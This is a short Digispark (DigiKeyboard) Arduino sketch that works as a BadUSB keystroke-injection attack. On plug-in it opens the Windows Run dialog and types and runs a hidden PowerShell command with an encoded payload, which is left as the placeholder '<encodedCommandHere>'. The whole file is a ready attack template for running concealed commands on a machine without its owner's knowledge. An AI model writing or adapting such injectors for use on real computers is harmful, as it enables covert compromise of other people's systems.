#include "DigiKeyboard.h"

void setup() {
    // Wait a moment for the system to be ready
    DigiKeyboard.delay(500);

    // Open Run dialog (Win+R)
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    // Type PowerShell command to run encoded script in hidden mode
    DigiKeyboard.print(F("powershell.exe -windowstyle hidden -encodedCommand <encodedCommandHere>"));
    DigiKeyboard.delay(500);

    // Press Enter to execute the command
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
    // Empty loop since this code runs only once
}
